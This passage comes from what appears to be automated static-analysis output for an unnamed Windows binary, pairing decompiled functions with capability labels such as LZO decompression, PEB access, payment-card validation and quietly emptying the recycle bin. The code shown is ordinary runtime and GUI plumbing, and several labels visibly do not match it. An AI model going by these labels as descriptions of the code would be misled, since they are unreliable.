+ 0x1c) != 0);\n            iVar8 = *(unaff_EBP + -0x40);\n        }\n        *(unaff_EBP + 0x20) = *(unaff_EBP + 0x20) - iVar8;\n        *(unaff_EBP + 0x18) = *(unaff_EBP + 0x18) + 0xfffc;\n    }\n    if (**(unaff_EBP + -0x34) == 0x7b) {\n        uVar6 = (*_sym.imp.ole32.dll_CLSIDFromString)();\n    }\n    else {\n        uVar6 = (*_sym.imp.ole32.dll_CLSIDFromProgID)(*(unaff_EBP + -0x34), unaff_EBP + -0x20, iVar10);\n    }\n    *(unaff_EBP + 0x1c) = uVar6;\n    fcn.00433fd3(arg_8h_00, *(unaff_EBP + 0x20), 0);\n    iVar3 = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x24) = 0;\n    if (((-1 < *(unaff_EBP + 0x1c)) && (iVar10 = fcn.00410918(),  iVar10 != 0)) &&\n       (iVar10 = fcn.004112c2(0, unaff_EBP + -0x20, 0, *puVar11, unaff_EBP + -0x68, *(puVar11 + 4), \n                              -(iVar3 != 0x378) & unaff_EBP - 0x94U, *(unaff_EBP + 0x18) == 0x377, *(unaff_EBP + -0x28)\n                              , unaff_EBP + -0x24),  iVar10 != 0)) {\n        fcn.00411fa9(1);\n        (*_sym.imp.USER32.dll_SetWindowPos)(*(*(unaff_EBP + -0x24) + 0x20), *(unaff_EBP + 0xc), 0, 0, 0, 0, 0x13);\n        *(*(unaff_EBP + -0x24) + 0x90) = *(unaff_EBP + -0x2c);\n        fcn.0040fa3c(unaff_EBP + 0x14);\n        *(*(unaff_EBP + -0x24) + 0x94) = *(unaff_EBP + -0x38);\n        *(*(unaff_EBP + -0x24) + 0x98) = *(unaff_EBP + -0x3c);\n        *(*(unaff_EBP + -0x24) + 0x9c) = *(unaff_EBP + -0x30);\n    }\n    if (*(unaff_EBP + -0x28) != 0) {\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(unaff_EBP + -0x28));\n    }\n    if (*(unaff_EBP + -0x24) == 0) {\n        **(unaff_EBP + 0x24) = 0;\n    }\n    else {\n        **(unaff_EBP + 0x24) = *(*(unaff_EBP + -0x24) + 0x20);\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.0043433e();\n    fcn.004014f0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 2557
    },
    "004199a7": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00419a39: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00419a3e)\n// WARNING: Removing unreachable block (ram,0x00419a64)\n// WARNING: Removing unreachable block (ram,0x00419a43)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004199a7(uint uExitCode, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00419d14(0x4419b8, 8);\n    fcn.0041c713(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x4507c4 == 1) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(*(unaff_EBP + 8));\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    }\n    *0x4507c0 = 1;\n    *0x4507bc = *(unaff_EBP + 0x10);\n    if (*(unaff_EBP + 0xc) == 0) {\n        if (*0x452228 != NULL) {\n            while( true ) {\n                *0x452224 = *0x452224 + -1;\n                if (*0x452224 < *0x452228) break;\n                if (**0x452224 != NULL) {\n                    (***0x452224)();\n                }\n            }\n        }\n        fcn.00419925(0x44c0bc);\n    }\n    fcn.00419925(0x44c0c8);\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0041c65e(8);\n    }\n    return;\n}\n",
        "token_count": 445
    },
    "0041e2dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e2dc(ulong *arg_8h, ulong *arg_ch, ulong *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_24h;\n    char *var_20h;\n    ulong uStack32;\n    ulong uStack24;\n    ulong uStack16;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    if (0xa1 < arg_14h) {\n        if (arg_14h < 0x3eb) {\n            if (arg_14h != 0x3ea) {\n                if (arg_14h == 0xa2) {\n                    var_24h = 4;\n                    goto code_r0x0041e48e;\n                }\n                if (arg_14h == 0xa6) {\n                    var_24h = 3;\n                    var_20h = \"exp10\";\n                }\n                else {\n                    if (arg_14h != 0xaa) {\n                        if (arg_14h == 0xab) {\n                            var_20h = \"log2\";\n                            goto code_r0x0041e527;\n                        }\n                        if (arg_14h == 1000) {\n                            var_20h = 0x441cbc;\n                        }\n                        else {\n                            if (arg_14h != 0x3e9) goto code_r0x0041e55f;\n                            var_20h = \"log10\";\n                        }\n                        goto code_r0x0041e51d;\n                    }\n                    var_24h = 2;\n                    var_20h = \"log2\";\n                }\n                goto code_r0x0041e495;\n            }\n            var_20h = 0x441cc8;\n        }\n        else if (arg_14h == 0x3eb) {\n            var_20h = \"atan\";\n        }\n        else if (arg_14h == 0x3ec) {\n            var_20h = \"ceil\";\n        }\n        else if (arg_14h == 0x3ed) {\n            var_20h = \"floor\";\n        }\n        else {\n            if (arg_14h == 0x3ee) {\ncode_r0x0041e4f5:\n                var_20h = 0x441cb8;\n                goto code_r0x0041e527;\n            }\n            if (arg_14h != 0x3ef) goto code_r0x0041e55f;\n            var_20h = \"modf\";\n        }\ncode_r0x0041e51d:\n        *arg_10h = *arg_8h;\n        goto code_r0x0041e527;\n    }\n    if (arg_14h == 0xa1) {\n        var_24h = 3;\ncode_r0x0041e48e:\n        var_20h = \"exp2\";\n        goto code_r0x0041e495;\n    }\n    if (arg_14h < 0x19) {\n        if (arg_14h == 0x18) {\n            var_24h = 3;\ncode_r0x0041e386:\n            var_20h = 0x441cb8;\n        }\n        else if (arg_14h == 2) {\n            var_24h = 2;\n            var_20h = 0x441cbc;\n        }\n        else {\n            if (arg_14h == 3) {\n                var_20h = 0x441cbc;\ncode_r0x0041e527:\n                uStack32 = *arg_8h;\n                var_24h = 1;\n                uStack24 = *arg_ch;\n                uStack16 = *arg_10h;\n                iVar1 = (**0x44d978)(&var_24h);\n                if (iVar1 == 0) {\n                    puVar2 = fcn.0041a92a();\n                    *puVar2 = 0x21;\n                }\n                goto code_r0x0041e55a;\n            }\n            if (arg_14h == 8) {\n                var_24h = 2;\n                var_20h = \"log10\";\n            }\n            else {\n                if (arg_14h == 9) {\n                    var_20h = \"log10\";\n                    goto code_r0x0041e527;\n                }\n                if (arg_14h != 0xe) {\n                    if (arg_14h != 0xf) goto code_r0x0041e55f;\n                    var_20h = 0x441cc8;\n                    goto code_r0x0041e3d3;\n                }\n                var_24h = 3;\n                var_20h = 0x441cc8;\n            }\n        }\ncode_r0x0041e495:\n        uStack32 = *arg_8h;\n        uStack24 = *arg_ch;\n        uStack16 = *arg_10h;\n        iVar1 = (**0x44d978)(&var_24h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.0041a92a();\n            *puVar2 = 0x22;\n        }\n    }\n    else {\n        if (arg_14h != 0x19) {\n            if (arg_14h == 0x1a) {\n                *arg_10h = 0x3ff0000000000000;\n                goto code_r0x0041e55f;\n            }\n            if (arg_14h != 0x1b) {\n                if (arg_14h == 0x1c) goto code_r0x0041e4f5;\n                if (arg_14h != 0x1d) goto code_r0x0041e55f;\n                var_20h = 0x441cb8;\n                goto code_r0x0041e51d;\n            }\n            var_24h = 2;\n            goto code_r0x0041e386;\n        }\n        var_20h = 0x441cb8;\ncode_r0x0041e3d3:\n        uStack32 = *arg_8h;\n        uStack24 = *arg_ch;\n        uStack16 = *arg_10h;\n        var_24h = 4;\n        (**0x44d978)(&var_24h);\n    }\ncode_r0x0041e55a:\n    *arg_10h = uStack16;\ncode_r0x0041e55f:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 1472
    },
    "00422171": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00422171(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    puVar3 = param_1 + (param_2 / 0x20) * 4;\n    iVar1 = fcn.004252a6(*puVar3, 1 << (0x1fU - param_2 % 0x20 & 0x1f), puVar3);\n    iVar2 = param_2 / 0x20 + -1;\n    if (-1 < iVar2) {\n        puVar3 = param_1 + iVar2 * 4;\n        do {\n            if (iVar1 == 0) {\n                return;\n            }\n            iVar1 = fcn.004252a6(*puVar3, 1, puVar3);\n            iVar2 = iVar2 + -1;\n            puVar3 = puVar3 + -1;\n        } while (-1 < iVar2);\n    }\n    return;\n}\n",
        "token_count": 231
    },
    "00417e25": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417e25(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0041b4e2(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 106
    },
    "0042fa7e": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint32_t fcn.0042fa7e(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00438808();\n    return iVar1 + 0x30;\n}\n",
        "token_count": 45
    },
    "00411ebe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411ebe(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((*(in_ECX + 0x7c) == 0) || (*(in_ECX + 0x78) == 0)) {\n        var_8h = 0;\n    }\n    else {\n        puVar2 = fcn.0042f804(*(in_ECX + 0x7c) * 6);\n        iVar3 = (*_sym.imp.USER32.dll_CopyAcceleratorTableA)(*(in_ECX + 0x78), puVar2, *(in_ECX + 0x7c));\n        var_8h = 0;\n        var_4h = 0;\n        if (0 < iVar3) {\n            puVar4 = puVar2;\n            do {\n                if (*(arg_8h + 4) == 0x106) {\n                    uVar1 = 0x10;\n                }\n                else {\n                    uVar1 = 0;\n                }\n                if (((*puVar4 & 0xfd) == uVar1) && (*(puVar4 + 2) == *(arg_8h + 8))) {\n                    var_8h = 1;\n                    break;\n                }\n                var_4h = var_4h + 1;\n                puVar4 = puVar4 + 6;\n            } while (var_4h < iVar3);\n        }\n        fcn.0042f834(puVar2);\n    }\n    return var_8h;\n}\n",
        "token_count": 391
    },
    "0041cbf1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041cbf1(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 0x10);\n    iVar7 = 0;\n    for (iVar3 = *(arg_8h + 8); -1 < iVar3; iVar3 = iVar3 << 1) {\n        iVar7 = iVar7 + 1;\n    }\n    iVar3 = iVar7 * 0x204 + 0x144 + iVar2;\n    iVar6 = 0x3f;\n    iVar4 = iVar3;\n    do {\n        *(iVar4 + 8) = iVar4;\n        *(iVar4 + 4) = iVar4;\n        iVar4 = iVar4 + 8;\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    uVar8 = iVar7 * 0x8000 + *(arg_8h + 0xc);\n    iVar4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(uVar8, 0x8000, 0x1000, 4);\n    if (iVar4 == 0) {\n        iVar7 = -1;\n    }\n    else {\n        if (uVar8 <= uVar8 + 0x7000) {\n            piVar5 = uVar8 + 0x10;\n            iVar4 = ((uVar8 + 0x7000) - uVar8 >> 0xc) + 1;\n            do {\n                piVar5[-2] = -1;\n                piVar5[0x3fb] = -1;\n                *piVar5 = piVar5 + 0x3ff;\n                piVar5[-1] = 0xff0;\n                piVar5[1] = piVar5 + -0x401;\n                piVar5[0x3fa] = 0xff0;\n                piVar5 = piVar5 + 0x400;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        *(iVar3 + 0x1fc) = uVar8 + 0xc;\n        *(uVar8 + 0x14) = iVar3 + 0x1f8;\n        *(iVar3 + 0x200) = uVar8 + 0x700c;\n        *(uVar8 + 0x7010) = iVar3 + 0x1f8;\n        *(iVar2 + 0x44 + iVar7 * 4) = 0;\n        *(iVar2 + 0xc4 + iVar7 * 4) = 1;\n        cVar1 = *(iVar2 + 0x43);\n        *(iVar2 + 0x43) = cVar1 + '\\x01';\n        if (cVar1 == '\\0') {\n            *(arg_8h + 4) = *(arg_8h + 4) | 1;\n        }\n        *(arg_8h + 8) = *(arg_8h + 8) & ~(0x80000000U >> (iVar7 & 0x1f));\n    }\n    return iVar7;\n}\n",
        "token_count": 765
    },
    "00422554": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422554(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    uint32_t var_4h;\n    \n    uVar1 = *(arg_ch + 6);\n    var_4h = 0x80000000;\n    uVar3 = uVar1 >> 4;\n    uVar4 = uVar3 & 0x7ff;\n    uVar2 = *arg_ch;\n    if ((uVar3 & 0x7ff) == 0) {\n        if (((arg_ch[1] & 0xfffff) == 0) && (uVar2 == 0)) {\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            *(arg_8h + 2) = 0;\n            return;\n        }\n        uVar4 = uVar4 + 0x3c01;\n        var_4h = 0;\n    }\n    else if (uVar4 == 0x7ff) {\n        uVar4 = 0x7fff;\n    }\n    else {\n        uVar4 = uVar4 + 0x3c00;\n    }\n    arg_8h[1] = uVar2 >> 0x15 | (arg_ch[1] & 0xfffff) << 0xb | var_4h;\n    *arg_8h = uVar2 << 0xb;\n    while (var_4h == 0) {\n        uVar2 = arg_8h[1];\n        uVar4 = uVar4 - 1;\n        arg_8h[1] = uVar2 << 1 | *arg_8h >> 0x1f;\n        *arg_8h = *arg_8h * 2;\n        var_4h = uVar2 << 1 & 0x80000000;\n    }\n    *(arg_8h + 2) = uVar1 & 0x8000 | uVar4;\n    return;\n}\n",
        "token_count": 479
    },
    "00422f48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00422f48(uint32_t arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    uint64_t uVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t extraout_EDX;\n    float10 fVar4;\n    \n    if (CONCAT17(arg_ch._3_1_, CONCAT16(arg_ch._2_1_, CONCAT24(arg_ch, arg_8h))) == *0x43e070) {\n        fVar4 = 0;\n        iVar3 = 0;\n    }\n    else if (((arg_ch & 0x7ff00000) == 0) && (((arg_ch & 0xfffff) != 0 || (arg_8h != 0)))) {\n        if (*0x43e070 <= CONCAT17(arg_ch._3_1_, CONCAT16(arg_ch._2_1_, CONCAT24(arg_ch, arg_8h)))) {\n            bVar2 = false;\n        }\n        else {\n            bVar2 = true;\n        }\n        while ((arg_ch._2_1_ & 0x10) == 0) {\n            iVar3 = CONCAT13(arg_ch._3_1_, CONCAT12(arg_ch._2_1_, arg_ch)) << 1;\n            arg_ch._0_2_ = iVar3;\n            arg_ch._2_1_ = iVar3 >> 0x10;\n            arg_ch._3_1_ = iVar3 >> 0x18;\n            if ((arg_8h & 0x80000000) != 0) {\n                arg_ch._0_2_ = arg_ch | 1;\n            }\n            arg_8h = arg_8h << 1;\n        }\n        if (bVar2) {\n            arg_ch._3_1_ = arg_ch._3_1_ | 0x80;\n        }\n        uVar1 = CONCAT17(arg_ch._3_1_, CONCAT16(arg_ch._2_1_, CONCAT24(arg_ch, arg_8h))) & 0xffefffffffffffff;\n        fVar4 = fcn.00422ec3(uVar1, uVar1 >> 0x20, 0);\n        iVar3 = extraout_EDX;\n    }\n    else {\n        fVar4 = fcn.00422ec3(arg_8h, CONCAT17(arg_ch._3_1_, CONCAT16(arg_ch._2_1_, CONCAT24(arg_ch, arg_8h))) >> 0x20, 0\n                            );\n        iVar3 = ((arg_ch >> 0x10 & 0x7ff0) >> 4) - 0x3fe;\n    }\n    *arg_10h = iVar3;\n    return fVar4;\n}\n",
        "token_count": 604
    },
    "00425325": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid fcn.00425325(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    *param_1 = uVar1 * 2;\n    param_1[1] = uVar2 * 2 | uVar1 >> 0x1f;\n    param_1[2] = param_1[2] << 1 | uVar2 >> 0x1f;\n    return;\n}\n",
        "token_count": 125
    },
    "0043493f": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043493f(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    if ((((param_2 != 0) && (param_2 != 6)) && (param_2 != 7)) && ((param_2 != 8 && (param_2 != 4)))) {\n        uVar1 = (*_sym.imp.USER32.dll_GetLastActivePopup)(*(param_1 + 0x1c));\n        (*_sym.imp.USER32.dll_BringWindowToTop)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "00418bd9": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
